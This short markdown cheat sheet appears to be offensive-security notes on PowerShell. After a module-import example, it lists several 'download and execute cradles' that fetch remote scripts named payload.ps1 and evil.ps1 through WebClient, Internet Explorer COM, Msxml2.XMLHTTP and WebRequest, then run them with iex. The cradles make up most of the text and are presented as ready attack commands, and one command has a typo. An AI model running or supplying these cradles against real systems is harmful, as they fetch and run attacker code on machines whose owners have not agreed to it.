### Powershell Scripts/Modules


Import Script or Module :heavy_check_mark:
```
Import-Module C:\path\to\script.ps1
```

Find all commands in module 
```
Get-Command -Module <modulename>
```

Download & Execute Cradle :heavy_check_mark:
```
iex (New-Object Net.WebClient) .DownloadString('https://webservers/payload.ps1')
```

??
```
$ie=New-Object -ComObjectInternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://192.168.230.1/evil.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response
```
```
$h=New-Object -ComObject
Msxml2.XMLHTTP;$h.open('GET','http://192.168.230.1/evil.ps1',$false);$h.send();iex
$h.responseText
```
```
$wr = [System.NET.WebRequest]::Create("http://192.168.230.1/evil.ps1")
$r = $wr.GetResponse()
IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()



